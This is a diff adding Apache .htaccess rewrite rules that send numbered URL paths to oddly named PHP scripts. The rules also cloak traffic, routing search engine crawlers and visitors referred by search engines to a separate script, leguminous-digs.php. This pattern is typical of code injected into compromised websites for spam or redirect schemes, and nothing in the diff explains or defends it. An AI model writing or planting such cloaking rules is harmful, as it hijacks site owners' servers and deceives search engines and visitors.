@@ -1,0 +1,17 @@
+RewriteEngine on
+RewriteRule ^1702650570/(.*)$ grabbers-forecasters.php [QSA,L]
+
+RewriteEngine on
+RewriteRule ^0527507495/(.*)$ evileyes-axles.php [QSA,L]
+
+RewriteEngine on
+RewriteRule ^1381747047/(.*)$ beset-longue.php [QSA,L]
+
+RewriteEngine On
+
+RewriteCond %{ENV:REDIRECT_STATUS} 200
+RewriteRule ^ - [L]
+RewriteCond %{HTTP_USER_AGENT} (google|yahoo|msn|aol|bing) [OR]
+RewriteCond %{HTTP_REFERER} (google|yahoo|msn|aol|bing)
+RewriteRule ^(.*)$ leguminous-digs.php?$1 [L]
+
